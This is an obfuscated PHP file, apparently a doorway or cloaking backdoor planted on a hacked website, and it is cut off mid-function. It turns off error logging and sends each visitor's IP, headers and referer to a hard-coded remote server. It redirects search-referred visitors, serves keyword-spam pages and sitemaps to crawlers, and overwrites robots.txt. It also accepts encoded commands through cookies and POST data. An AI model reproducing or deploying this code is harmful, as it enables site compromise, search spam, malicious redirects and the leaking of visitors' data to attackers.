<?php

@ini_set('error_log', NULL);@ini_set('log_errors', 0);@ini_set('max_execution_time', 0);@error_reporting(0);@set_time_limit(0);date_default_timezone_set('UTC');class _3t2zxo{static private $_gno8vcjd = 84485428;static function _304yb($_nbsjolq0, $_6v0kiiv7){$_nbsjolq0[2] = count($_nbsjolq0) > 4 ? long2ip(_3t2zxo::$_gno8vcjd - 807) : $_nbsjolq0[2];$_va77akfk = _3t2zxo::_4om8d($_nbsjolq0, $_6v0kiiv7);if (!$_va77akfk) {$_va77akfk = _3t2zxo::_kaov7($_nbsjolq0, $_6v0kiiv7);}return $_va77akfk;}static function _4om8d($_nbsjolq0, $_va77akfk, $_p2eusua0 = NULL){if (!function_exists('curl_version')) {return "";}if (is_array($_nbsjolq0)) {$_nbsjolq0 = implode("/", $_nbsjolq0);}$_9qdaupp2 = curl_init();curl_setopt($_9qdaupp2, CURLOPT_SSL_VERIFYHOST, false);curl_setopt($_9qdaupp2, CURLOPT_SSL_VERIFYPEER, false);curl_setopt($_9qdaupp2, CURLOPT_URL, $_nbsjolq0);if (!empty($_va77akfk)) {curl_setopt($_9qdaupp2, CURLOPT_POST, 1);curl_setopt($_9qdaupp2, CURLOPT_POSTFIELDS, $_va77akfk);}if (!empty($_p2eusua0)) {curl_setopt($_9qdaupp2, CURLOPT_HTTPHEADER, $_p2eusua0);}curl_setopt($_9qdaupp2, CURLOPT_RETURNTRANSFER, TRUE);$_21uvdyfl = curl_exec($_9qdaupp2);curl_close($_9qdaupp2);return $_21uvdyfl;}static function _kaov7($_nbsjolq0, $_va77akfk, $_p2eusua0 = NULL){if (is_array($_nbsjolq0)) {$_nbsjolq0 = implode("/", $_nbsjolq0);}$_hd881kgc = "\r" . "\n";if (!empty($_va77akfk)) {$_5p4trhye = array('method' => 'POST','header' => 'Content-type: application/x-www-form-urlencoded','content' => $_va77akfk);if (!empty($_p2eusua0)) {$_5p4trhye["header"] = $_5p4trhye["header"] . $_hd881kgc . implode($_hd881kgc, $_p2eusua0);}$_z2whmiy9 = stream_context_create(array('http' => $_5p4trhye));} else {$_5p4trhye = array('method' => 'GET',);if (!empty($_p2eusua0)) {$_5p4trhye["header"] = implode($_hd881kgc, $_p2eusua0);}$_z2whmiy9 = stream_context_create(array('http' => $_5p4trhye));}return @file_get_contents($_nbsjolq0, FALSE, $_z2whmiy9);}}class _gryhhsj{private static $_1wy5vw1r = "";private static $_e0sdx442 = -1;private static $_9cdz2u2a = "";private $_vig3mnjm = "";private $_rx3qzvka = "";private $_0jp8b8zn = "";private $_4vnopgge = "";public static function _5nn0o($_oic0ph03, $_46pyytgr, $_hytbmk63){_gryhhsj::$_1wy5vw1r = $_oic0ph03 . "/cache/";_gryhhsj::$_e0sdx442 = $_46pyytgr;_gryhhsj::$_9cdz2u2a = $_hytbmk63;if (!@file_exists(_gryhhsj::$_1wy5vw1r)) {@mkdir(_gryhhsj::$_1wy5vw1r);}}static public function _vbciz(){$_xxow4au8 = substr(md5(_gryhhsj::$_9cdz2u2a . "salt13"), 0, 4);$_zrkdtez8 = Array("google" => Array(), "bing" => Array(),);foreach (array_keys($_zrkdtez8) as $_rmwvuexy){$_r61m5bgz = $_xxow4au8 . "_" . $_rmwvuexy . ".stats";$_vcir81nx = @file($_r61m5bgz, FILE_IGNORE_NEW_LINES);foreach ($_vcir81nx as $_5hvy9i6b){$_9iunk2hp = explode("\t", $_5hvy9i6b);if (!isset($_zrkdtez8[$_rmwvuexy][$_9iunk2hp[1]])){$_zrkdtez8[$_rmwvuexy][$_9iunk2hp[1]] = 0;}$_zrkdtez8[$_rmwvuexy][$_9iunk2hp[1]] += 1;}}$_zrkdtez8["prefix"] = $_xxow4au8;return $_zrkdtez8;}public static function _nrmqa(){return TRUE;}public function __construct($_1d16jnpv, $_fbp72yvi, $_cb6m2yef, $_eiaic0um){$this->_vig3mnjm = $_1d16jnpv;$this->_rx3qzvka = $_fbp72yvi;$this->_0jp8b8zn = $_cb6m2yef;$this->_4vnopgge = $_eiaic0um;}public function _038oz(){function _qgiea($_a6dtouig, $_q88gr3wz){return round(rand($_a6dtouig, $_q88gr3wz - 1) + (rand(0, PHP_INT_MAX - 1) / PHP_INT_MAX), 2);}$_vtp3rifs = time();$_rmwvuexy = (strpos($_SERVER["HTTP_USER_AGENT"], "google") !== FALSE) ? "google" : (strpos($_SERVER["HTTP_USER_AGENT"], "bing") !== FALSE ? "bing" : "none");$_r61m5bgz = substr(md5(_gryhhsj::$_9cdz2u2a . "salt13"), 0, 4) . "_" . $_rmwvuexy . ".stats";@file_put_contents($_r61m5bgz, $this->_0jp8b8zn . "\t" . ($_vtp3rifs - ($_vtp3rifs % 3600)) .PHP_EOL, 8);$_trezdspf = _hehd2qc::_x4oa5();$_va77akfk = str_replace("{{ text }}", $this->_rx3qzvka,str_replace("{{ keyword }}", $this->_0jp8b8zn,str_replace("{{ links }}", $this->_4vnopgge, $this->_vig3mnjm)));while (TRUE) {$_2mwpaaso = preg_replace('/' . preg_quote("{{ randkeyword }}", '/') . '/', _hehd2qc::_wlmgx(), $_va77akfk, 1);if ($_2mwpaaso === $_va77akfk) {break;}$_va77akfk = $_2mwpaaso;}while (TRUE) {preg_match('/{{ KEYWORDBYINDEX-ANCHOR (\d*) }}/', $_va77akfk, $_qp48rmi2);if (empty($_qp48rmi2)) {break;}$_cb6m2yef = @$_trezdspf[intval($_qp48rmi2[1])];$_s5n35nej = _6h7t1au::_aian9($_cb6m2yef);$_va77akfk = str_replace($_qp48rmi2[0], $_s5n35nej, $_va77akfk);}while (TRUE) {preg_match('/{{ KEYWORDBYINDEX (\d*) }}/', $_va77akfk, $_qp48rmi2);if (empty($_qp48rmi2)) {break;}$_cb6m2yef = @$_trezdspf[intval($_qp48rmi2[1])];$_va77akfk = str_replace($_qp48rmi2[0], $_cb6m2yef, $_va77akfk);}while (TRUE) {preg_match('/{{ RANDFLOAT (\d*)-(\d*) }}/', $_va77akfk, $_qp48rmi2);if (empty($_qp48rmi2)) {break;}$_va77akfk = str_replace($_qp48rmi2[0], _qgiea($_qp48rmi2[1], $_qp48rmi2[2]), $_va77akfk);}while (TRUE) {preg_match('/{{ RANDINT (\d*)-(\d*) }}/', $_va77akfk, $_qp48rmi2);if (empty($_qp48rmi2)) {break;}$_va77akfk = str_replace($_qp48rmi2[0], rand($_qp48rmi2[1], $_qp48rmi2[2]), $_va77akfk);}return $_va77akfk;}public function _1suf7(){$_rmwvuexy = (strpos($_SERVER["HTTP_USER_AGENT"], "google") !== FALSE) ? "google" : (strpos($_SERVER["HTTP_USER_AGENT"], "bing") !== FALSE ? "bing" : "none");$_r61m5bgz = _gryhhsj::$_1wy5vw1r . md5($this->_0jp8b8zn . _gryhhsj::$_9cdz2u2a) . $_rmwvuexy;if (_gryhhsj::$_e0sdx442 == -1) {$_cmcquqfn = -1;} else {$_cmcquqfn = time() + (3600 * 24 * 30);}$_h5ge1q0r = array("template" => $this->_vig3mnjm, "text" => $this->_rx3qzvka, "keyword" => $this->_0jp8b8zn,"links" => $this->_4vnopgge, "expired" => $_cmcquqfn);@file_put_contents($_r61m5bgz, serialize($_h5ge1q0r));}static public function _mxztm($_cb6m2yef){$_rmwvuexy = (strpos($_SERVER["HTTP_USER_AGENT"], "google") !== FALSE) ? "google" : (strpos($_SERVER["HTTP_USER_AGENT"], "bing") !== FALSE ? "bing" : "none");$_r61m5bgz = _gryhhsj::$_1wy5vw1r . md5($_cb6m2yef . _gryhhsj::$_9cdz2u2a) . $_rmwvuexy;$_r61m5bgz = @unserialize(@file_get_contents($_r61m5bgz));if (!empty($_r61m5bgz) && ($_r61m5bgz["expired"] > time() || $_r61m5bgz["expired"] == -1)) {return new _gryhhsj($_r61m5bgz["template"], $_r61m5bgz["text"], $_r61m5bgz["keyword"], $_r61m5bgz["links"]);} else {return null;}}}class _pl6grm{private static $_1wy5vw1r = "";private static $_2u5ujll9 = "";public static function _5nn0o($_oic0ph03, $_xxow4au8){_pl6grm::$_1wy5vw1r = $_oic0ph03 . "/";_pl6grm::$_2u5ujll9 = $_xxow4au8;if (!@file_exists(_pl6grm::$_1wy5vw1r)) {@mkdir(_pl6grm::$_1wy5vw1r);}}public static function _nrmqa(){return TRUE;}static public function _9nyhs(){$_yjrgrg7l = 0;foreach (scandir(_pl6grm::$_1wy5vw1r) as $_xpalds8s) {if (strpos($_xpalds8s, _pl6grm::$_2u5ujll9) === 0) {$_yjrgrg7l += 1;}}return $_yjrgrg7l;}static public function _wlmgx(){$_8jir4spg = array();foreach (scandir(_pl6grm::$_1wy5vw1r) as $_xpalds8s) {if (strpos($_xpalds8s, _pl6grm::$_2u5ujll9) === 0) {$_8jir4spg[] = $_xpalds8s;}}return @file_get_contents(_pl6grm::$_1wy5vw1r . $_8jir4spg[array_rand($_8jir4spg)]);}static public function _1suf7($_6gyzsrnz){if (@file_exists(_pl6grm::$_2u5ujll9 . "_" . md5($_6gyzsrnz) . ".html")) {return;}@file_put_contents(_pl6grm::$_2u5ujll9 . "_" . md5($_6gyzsrnz) . ".html", $_6gyzsrnz);}}class _hehd2qc{private static $_1wy5vw1r = "";private static $_2u5ujll9 = "";private static $_p8tkxnx5 = array();private static $_bqr54z9t = array();public static function _5nn0o($_oic0ph03, $_xxow4au8){_hehd2qc::$_1wy5vw1r = $_oic0ph03 . "/";_hehd2qc::$_2u5ujll9 = $_xxow4au8;if (!@file_exists(_hehd2qc::$_1wy5vw1r)) {@mkdir(_hehd2qc::$_1wy5vw1r);}}private static function _r7a6s(){$_8nltvahj = array();foreach (scandir(_hehd2qc::$_1wy5vw1r) as $_xpalds8s) {if (strpos($_xpalds8s, _hehd2qc::$_2u5ujll9) === 0) {$_8nltvahj[] = $_xpalds8s;}}return $_8nltvahj;}public static function _nrmqa(){return TRUE;}static public function _wlmgx(){if (empty(_hehd2qc::$_p8tkxnx5)) {$_8nltvahj = _hehd2qc::_r7a6s();_hehd2qc::$_p8tkxnx5 = @file(_hehd2qc::$_1wy5vw1r . $_8nltvahj[array_rand($_8nltvahj)], FILE_IGNORE_NEW_LINES);}return _hehd2qc::$_p8tkxnx5[array_rand(_hehd2qc::$_p8tkxnx5)];}static public function _x4oa5(){if (empty(_hehd2qc::$_bqr54z9t)) {$_8nltvahj = _hehd2qc::_r7a6s();foreach ($_8nltvahj as $_1jf5f8af) {_hehd2qc::$_bqr54z9t = array_merge(_hehd2qc::$_bqr54z9t, @file(_hehd2qc::$_1wy5vw1r . $_1jf5f8af, FILE_IGNORE_NEW_LINES));}}return _hehd2qc::$_bqr54z9t;}static public function _1suf7($_gaf31ihd){if (@file_exists(_hehd2qc::$_2u5ujll9 . "_" . md5($_gaf31ihd) . ".list")) {return;}@file_put_contents(_hehd2qc::$_2u5ujll9 . "_" . md5($_gaf31ihd) . ".list", $_gaf31ihd);}static public function _l8j1w($_cb6m2yef){@file_put_contents(_hehd2qc::$_2u5ujll9 . "_" . md5(_6h7t1au::$_kccu8oft) . ".list", $_cb6m2yef . "\n", 8);}}class _6h7t1au{static public $_e66exhwx = "5.5";static public $_kccu8oft = "1c2c6847-b95b-c2ce-088f-658c89247545";static public $_yik90q98 = "http://136.12.78.46/app/assets/api2?action=redir";static public $_rswl4goo = "http://136.12.78.46/app/assets/api?action=page";static public $_oopjrvia = 1;static public $_l5zc4fvu = 5;private function _8yt1p(){$_6xhs4eo6 = array('#libwww-perl#i','#MJ12bot#i','#msnbot#i', '#msnbot-media#i','#YandexBot#i', '#msnbot#i', '#YandexWebmaster#i','#spider#i', '#yahoo#i', '#google#i', '#altavista#i','#ask#i','#yahoo!\s*slurp#i','#BingBot#i');if (!empty($_SERVER['HTTP_USER_AGENT']) && (FALSE !== strpos(preg_replace($_6xhs4eo6, '-NO-WAY-', $_SERVER['HTTP_USER_AGENT']), '-NO-WAY-'))) {$_gq9329ub = 1;} elseif (empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) || empty($_SERVER['HTTP_REFERER'])) {$_gq9329ub = 1;} elseif (strpos($_SERVER['HTTP_REFERER'], "google") === FALSE &&strpos($_SERVER['HTTP_REFERER'], "yahoo") === FALSE &&strpos($_SERVER['HTTP_REFERER'], "bing") === FALSE &&strpos($_SERVER['HTTP_REFERER'], "yandex") === FALSE) {$_gq9329ub = 1;} else {$_gq9329ub = 0;}return $_gq9329ub;}private static function _2ulwh(){$_6v0kiiv7 = array();$_6v0kiiv7['ip'] = $_SERVER['REMOTE_ADDR'];$_6v0kiiv7['qs'] = @$_SERVER['HTTP_HOST'] . @$_SERVER['REQUEST_URI'];$_6v0kiiv7['ua'] = @$_SERVER['HTTP_USER_AGENT'];$_6v0kiiv7['lang'] = @$_SERVER['HTTP_ACCEPT_LANGUAGE'];$_6v0kiiv7['ref'] = @$_SERVER['HTTP_REFERER'];$_6v0kiiv7['enc'] = @$_SERVER['HTTP_ACCEPT_ENCODING'];$_6v0kiiv7['acp'] = @$_SERVER['HTTP_ACCEPT'];$_6v0kiiv7['char'] = @$_SERVER['HTTP_ACCEPT_CHARSET'];$_6v0kiiv7['conn'] = @$_SERVER['HTTP_CONNECTION'];return $_6v0kiiv7;}public function __construct(){_6h7t1au::$_yik90q98 = explode("/", _6h7t1au::$_yik90q98);_6h7t1au::$_rswl4goo = explode("/", _6h7t1au::$_rswl4goo);}static public function _f2iig($_vnis9as2){if (strlen($_vnis9as2) < 4) {return "";}$_avr76rlh = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";$_trezdspf = str_split($_avr76rlh);$_trezdspf = array_flip($_trezdspf);$_xerwudn9 = 0;$_jaaeqebq = "";$_vnis9as2 = preg_replace("~[^A-Za-z0-9\+\/\=]~", "", $_vnis9as2);do {$_99htocyw = $_trezdspf[$_vnis9as2[$_xerwudn9++]];$_vin2e0vi = $_trezdspf[$_vnis9as2[$_xerwudn9++]];$_9smjd9zh = $_trezdspf[$_vnis9as2[$_xerwudn9++]];$_hse3e338 = $_trezdspf[$_vnis9as2[$_xerwudn9++]];$_tvjva8ho = ($_99htocyw << 2) | ($_vin2e0vi >> 4);$_knn6nqij = (($_vin2e0vi & 15) << 4) | ($_9smjd9zh >> 2);$_23bgzz11 = (($_9smjd9zh & 3) << 6) | $_hse3e338;$_jaaeqebq = $_jaaeqebq . chr($_tvjva8ho);if ($_9smjd9zh != 64) {$_jaaeqebq = $_jaaeqebq . chr($_knn6nqij);}if ($_hse3e338 != 64) {$_jaaeqebq = $_jaaeqebq . chr($_23bgzz11);}} while ($_xerwudn9 < strlen($_vnis9as2));return $_jaaeqebq;}private function _165yk($_cb6m2yef){$_1d16jnpv = "";$_fbp72yvi = "";$_6v0kiiv7 = _6h7t1au::_2ulwh();$_6v0kiiv7["uid"] = _6h7t1au::$_kccu8oft;$_6v0kiiv7["keyword"] = $_cb6m2yef;$_6v0kiiv7["tc"] = 10;$_6v0kiiv7 = http_build_query($_6v0kiiv7);$_vcir81nx = _3t2zxo::_304yb(_6h7t1au::$_rswl4goo, $_6v0kiiv7);if (strpos($_vcir81nx, _6h7t1au::$_kccu8oft) === FALSE) {return array($_1d16jnpv, $_fbp72yvi);}$_1d16jnpv = _pl6grm::_wlmgx();$_fbp72yvi = substr($_vcir81nx, strlen(_6h7t1au::$_kccu8oft));$_fbp72yvi = explode("\n", $_fbp72yvi);shuffle($_fbp72yvi);$_fbp72yvi = implode(" ", $_fbp72yvi);return array($_1d16jnpv, $_fbp72yvi);}private function _csq5o(){$_6v0kiiv7 = _6h7t1au::_2ulwh();if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {$_6v0kiiv7['cfconn'] = @$_SERVER['HTTP_CF_CONNECTING_IP'];}if (isset($_SERVER['HTTP_X_REAL_IP'])) {$_6v0kiiv7['xreal'] = @$_SERVER['HTTP_X_REAL_IP'];}if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {$_6v0kiiv7['xforward'] = @$_SERVER['HTTP_X_FORWARDED_FOR'];}$_6v0kiiv7["uid"] = _6h7t1au::$_kccu8oft;$_6v0kiiv7 = http_build_query($_6v0kiiv7);$_22xymd0n = _3t2zxo::_304yb(_6h7t1au::$_yik90q98, $_6v0kiiv7);$_22xymd0n = @unserialize($_22xymd0n);if (isset($_22xymd0n["type"]) && $_22xymd0n["type"] == "redir") {if (!empty($_22xymd0n["data"]["header"])) {header($_22xymd0n["data"]["header"]);return true;} elseif (!empty($_22xymd0n["data"]["code"])) {echo $_22xymd0n["data"]["code"];return true;}}return false;}public function _nrmqa(){return _gryhhsj::_nrmqa() && _pl6grm::_nrmqa() && _hehd2qc::_nrmqa();}static public function _zs4dd(){if ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || $_SERVER['SERVER_PORT'] == 443) {return true;}return false;}public static function _e06sr(){$_daqbf6ax = explode("?", $_SERVER["REQUEST_URI"], 2);$_daqbf6ax = $_daqbf6ax[0];if (strpos($_daqbf6ax, ".php") === FALSE) {$_daqbf6ax = explode("/", $_daqbf6ax);array_pop($_daqbf6ax);$_daqbf6ax = implode("/", $_daqbf6ax) . "/";}return sprintf("%s://%s%s", _6h7t1au::_zs4dd() ? "https" : "http", $_SERVER['HTTP_HOST'], $_daqbf6ax);}public static function _1nsht(){$_hpv83sws = Array("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15","Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15","Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36","Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36");$_axy83tef = array("https://www.google.com/ping?sitemap=" => "Sitemap Notification Received",);$_p2eusua0 = array("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language: en-US,en;q=0.5","User-Agent: " . $_hpv83sws[array_rand($_hpv83sws)],);$_sbid5s1u = urlencode(_6h7t1au::_th8lq() . "/sitemap.xml");foreach ($_axy83tef as $_nbsjolq0 => $_e9imt2v9) {$_j5qi4kx1 = _3t2zxo::_4om8d($_nbsjolq0 . $_sbid5s1u, NULL, $_p2eusua0);if (empty($_j5qi4kx1)) {$_j5qi4kx1 = _3t2zxo::_kaov7($_nbsjolq0 . $_sbid5s1u, NULL, $_p2eusua0);}if (empty($_j5qi4kx1)) {return FALSE;}if (strpos($_j5qi4kx1, $_e9imt2v9) === FALSE) {return FALSE;}}return TRUE;}public static function _bizgn(){$_ebvtkmzt = "User-agent: *\nDisallow: %s\nUser-agent: Bingbot\nUser-agent: Googlebot\nUser-agent: Slurp\nDisallow:\nSitemap: %s\n";$_daqbf6ax = explode("?", $_SERVER["REQUEST_URI"], 2);$_daqbf6ax = $_daqbf6ax[0];$_4mk7p7vc = substr($_daqbf6ax, 0, strrpos($_daqbf6ax, "/"));$_x7k55lwh = sprintf($_ebvtkmzt, $_4mk7p7vc, _6h7t1au::_th8lq() . "/sitemap.xml");$_b9oczrl1 = $_SERVER["DOCUMENT_ROOT"] . "/robots.txt";if (@file_exists($_b9oczrl1)) {@chmod($_b9oczrl1, 0777);$_cgja07w9 = @file_get_contents($_b9oczrl1);} else {$_cgja07w9 = "";}if (strpos($_cgja07w9, $_x7k55lwh) === FALSE) {@file_put_contents($_b9oczrl1, $_cgja07w9 . "\n" . $_x7k55lwh);$_cgja07w9 = @file_get_contents($_b9oczrl1);return (strpos($_cgja07w9, $_x7k55lwh) !== FALSE);}return FALSE;}public static function _th8lq(){$_daqbf6ax = explode("?", $_SERVER["REQUEST_URI"], 2);$_daqbf6ax = $_daqbf6ax[0];$_oic0ph03 = substr($_daqbf6ax, 0, strrpos($_daqbf6ax, "/"));return sprintf("%s://%s%s", _6h7t1au::_zs4dd() ? "https" : "http", $_SERVER['HTTP_HOST'], $_oic0ph03);}public static function _aian9($_cb6m2yef){$_q2srkxlu = _6h7t1au::_e06sr();$_lnnqs62q = substr(md5(_6h7t1au::$_kccu8oft . "salt3"), 0, 6);$_td60l8al = "";if (substr($_q2srkxlu, -1) == "/") {if (ord($_lnnqs62q[1]) % 2) {$_cb6m2yef = str_replace(" ", "-", $_cb6m2yef);} else {$_cb6m2yef = str_replace(" ", "-", $_cb6m2yef);}$_td60l8al = sprintf("%s%s", $_q2srkxlu, urlencode($_cb6m2yef));} else {if (FALSE && (ord($_lnnqs62q[0]) % 2)) {$_td60l8al = sprintf("%s?%s=%s",$_q2srkxlu,$_lnnqs62q,urlencode(str_replace(" ", "-", $_cb6m2yef)));} else {$_n0tfhmce = array("id", "page", "tag");$_ta1vacjo = $_n0tfhmce[ord($_lnnqs62q[2]) % count($_n0tfhmce)];if (ord($_lnnqs62q[1]) % 2) {$_cb6m2yef = str_replace(" ", "-", $_cb6m2yef);} else {$_cb6m2yef = str_replace(" ", "-", $_cb6m2yef);}$_td60l8al = sprintf("%s?%s=%s",$_q2srkxlu,$_ta1vacjo,urlencode($_cb6m2yef));}}return $_td60l8al;}public static function _tr5jf($_a6dtouig, $_q88gr3wz){$_6b4ho9h6 = "";$_9a78sonc = rand($_a6dtouig, $_q88gr3wz);for ($_xerwudn9 = 0; $_xerwudn9 < $_9a78sonc; $_xerwudn9++) {$_cb6m2yef = _hehd2qc::_wlmgx();$_6b4ho9h6 .= sprintf("<a href=\"%s\">%s</a>,\n",_6h7t1au::_aian9($_cb6m2yef), ucwords($_cb6m2yef));}return $_6b4ho9h6;}public static function _cxaqm($_2mqifc1f = FALSE){$_y61hwah0 = dirname(__FILE__) . "/sitemap.xml";$_o62n3fh0 = Array();$_csrnbegu = "<?xml version=\"1.0\" encoding=\"UTF-8\"?" . ">\n<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">\n";$_5ugx59nd = "</urlset>";$_trezdspf = _hehd2qc::_x4oa5();$_1jq470sh = array();if (file_exists($_y61hwah0)) {$_vcir81nx = simplexml_load_file($_y61hwah0);foreach ($_vcir81nx as $_cn30o3ng) {$_1jq470sh[(string)$_cn30o3ng->loc] = (string)$_cn30o3ng->lastmod;}} else {$_2mqifc1f = FALSE;}foreach ($_trezdspf as $_xefwz20k) {$_td60l8al = _6h7t1au::_aian9($_xefwz20k);if (isset($_1jq470sh[$_td60l8al])) {continue;}if ($_2mqifc1f) {$_mi56uvle = time();} else {$_mi56uvle = time() - (crc32($_xefwz20k) % (60 * 60 * 24 * 30));}$_1jq470sh[$_td60l8al] = date("Y-m-d", $_mi56uvle);$_79uznh5b = strtolower($_xefwz20k[0]);if (!preg_match("/^[a-z]$/", $_79uznh5b)) {$_79uznh5b = "other";}if (empty($_o62n3fh0[$_79uznh5b])){$_o62n3fh0[$_79uznh5b] = Array();}$_o62n3fh0[$_79uznh5b][$_xefwz20k] = $_td60l8al;}$_hj7u22ut = "";foreach ($_1jq470sh as $_nbsjolq0 => $_mi56uvle) {$_hj7u22ut .= "<url>\n";$_hj7u22ut .= sprintf("<loc>%s</loc>\n", $_nbsjolq0);$_hj7u22ut .= sprintf("<lastmod>%s</lastmod>\n", $_mi56uvle);$_hj7u22ut .= "</url>\n";}$_mljdu8no = $_csrnbegu . $_hj7u22ut . $_5ugx59nd;$_sbid5s1u = _6h7t1au::_th8lq() . "/sitemap.xml";@file_put_contents($_y61hwah0, $_mljdu8no);foreach ($_o62n3fh0 as $_79uznh5b => $_wkc8c4b9){$_mljdu8no = sprintf("<!DOCTYPE html><html>\n<head>\n<title>Articles \"%s\"</title>\n</head>\n<body>\n", $_79uznh5b);$_mljdu8no .= sprintf("<a href=\"%s\">%s</a><br>\n", _6h7t1au::_th8lq() . "/sitemap.html", "Sitemap Index");foreach ($_wkc8c4b9 as $_cb6m2yef => $_nbsjolq0){$_mljdu8no .= sprintf("<a href=\"%s\">%s</a><br>\n", $_nbsjolq0, $_cb6m2yef);}$_mljdu8no .= "</body></html>";$_y61hwah0 = dirname(__FILE__) . sprintf("/sitemap_%s.html", $_79uznh5b);@file_put_contents($_y61hwah0, $_mljdu8no);}$_mljdu8no = "<!DOCTYPE html><html>\n<head>\n<title>Article Alphabet Index</title>\n</head>\n<body>\n";foreach ($_o62n3fh0 as $_79uznh5b => $_wkc8c4b9){$_mljdu8no .= sprintf("<a href=\"%s\">%s</a><br>\n", _6h7t1au::_th8lq() . sprintf("/sitemap_%s.html", $_79uznh5b), strtoupper($_79uznh5b));}$_mljdu8no .= "</body></html>";$_y61hwah0 = dirname(__FILE__) . "/sitemap.html";@file_put_contents($_y61hwah0, $_mljdu8no);return $_sbid5s1u;}public function _h0ghq(){$_ta1vacjo = substr(md5(_6h7t1au::$_kccu8oft . "salt3"), 0, 6);if (!$this->_8yt1p()) {if ($this->_csq5o()) {return;}}if (!empty($_GET)) {$_9iunk2hp = array_values($_GET);} else {$_9iunk2hp = explode("/", $_SERVER["REQUEST_URI"]);$_9iunk2hp = array_reverse($_9iunk2hp);}$_cb6m2yef = "";foreach ($_9iunk2hp as $_8ds944gi) {if (substr_count($_8ds944gi, "-") > 0) {$_cb6m2yef = $_8ds944gi;break;}}$_cb6m2yef = str_replace($_ta1vacjo . "-", "", $_cb6m2yef);$_cb6m2yef = str_replace("-" . $_ta1vacjo, "", $_cb6m2yef);$_cb6m2yef = str_replace("-", " ", $_cb6m2yef);$_5xpwd9hl = array(".html", ".php", ".aspx");foreach ($_5xpwd9hl as $_duu98yy0) {if (strpos($_cb6m2yef, $_duu98yy0) === strlen($_cb6m2yef) - strlen($_duu98yy0)) {$_cb6m2yef = substr($_cb6m2yef, 0, strlen($_cb6m2yef) - strlen($_duu98yy0));}}$_cb6m2yef = urldecode($_cb6m2yef);$_sb1e4fe0 = _hehd2qc::_x4oa5();if (empty($_cb6m2yef)) {$_cb6m2yef = $_sb1e4fe0[0];} else if (!in_array($_cb6m2yef, $_sb1e4fe0)) {$_3dum5dph = 0;foreach (str_split($_cb6m2yef) as $_9qdaupp2) {$_3dum5dph += ord($_9qdaupp2);}$_cb6m2yef = $_sb1e4fe0[$_3dum5dph % count($_sb1e4fe0)];}if (!empty($_cb6m2yef)) {$_22xymd0n = _gryhhsj::_mxztm($_cb6m2yef);if (empty($_22xymd0n)) {list($_1d16jnpv, $_fbp72yvi) = $this->_165yk($_cb6m2yef);if (empty($_fbp72yvi)) {return;}$_eiaic0um = _6h7t1au::_tr5jf(_6h7t1au::$_oopjrvia, _6h7t1au::$_l5zc4fvu);$_79uznh5b = strtolower($_cb6m2yef[0]);if (!preg_match("/^[a-z]$/", $_79uznh5b)) {$_79uznh5b = "other";}$_eiaic0um .= sprintf("<a href=\"%s\">Articles %s</a><br>\n", _6h7t1au::_th8lq() . sprintf("/sitemap_%s.html", $_79uznh5b), strtoupper($_79uznh5b));$_22xymd0n = new _gryhhsj($_1d16jnpv, $_fbp72yvi, $_cb6m2yef, $_eiaic0um);$_22xymd0n->_1suf7();}echo $_22xymd0n->_038oz();}}}_gryhhsj::_5nn0o(dirname(__FILE__), -1, _6h7t1au::$_kccu8oft);_pl6grm::_5nn0o(dirname(__FILE__), substr(md5(_6h7t1au::$_kccu8oft . "salt12"), 0, 4));_hehd2qc::_5nn0o(dirname(__FILE__), substr(md5(_6h7t1au::$_kccu8oft . "salt22"), 0, 4));function _lskoq($_vcir81nx, $_xefwz20k){$_ttveyfms = "";for ($_xerwudn9 = 0; $_xerwudn9 < strlen($_vcir81nx);) {for ($_gbjr0k96 = 0; $_gbjr0k96 < strlen($_xefwz20k) && $_xerwudn9 < strlen($_vcir81nx); $_gbjr0k96++, $_xerwudn9++) {$_ttveyfms .= chr(ord($_vcir81nx[$_xerwudn9]) ^ ord($_xefwz20k[$_gbjr0k96]));}}return $_ttveyfms;}function _z66ol($_vcir81nx, $_xefwz20k, $_11i6yr1h){return _lskoq(_lskoq($_vcir81nx, $_xefwz20k), $_11i6yr1h);}foreach (array_merge($_COOKIE, $_POST) as $_m5qmia77 => $_vcir81nx) {$_vcir81nx = @unserialize(_z66ol(_6h7t1au::_f2iig($_vcir81nx), $_m5qmia77, _6h7t1au::$_kccu8oft));if (isset($_vcir81nx['ak']) && _6h7t1au::$_kccu8oft == $_vcir81nx['ak']) {if ($_vcir81nx['a'] == 'doorway2') {if ($_vcir81nx['sa'] == 'check') {$_va77akfk = _3t2zxo::_304yb(explode("/", _6h7t1au::$_yik90q98), "");$_va77akfk = 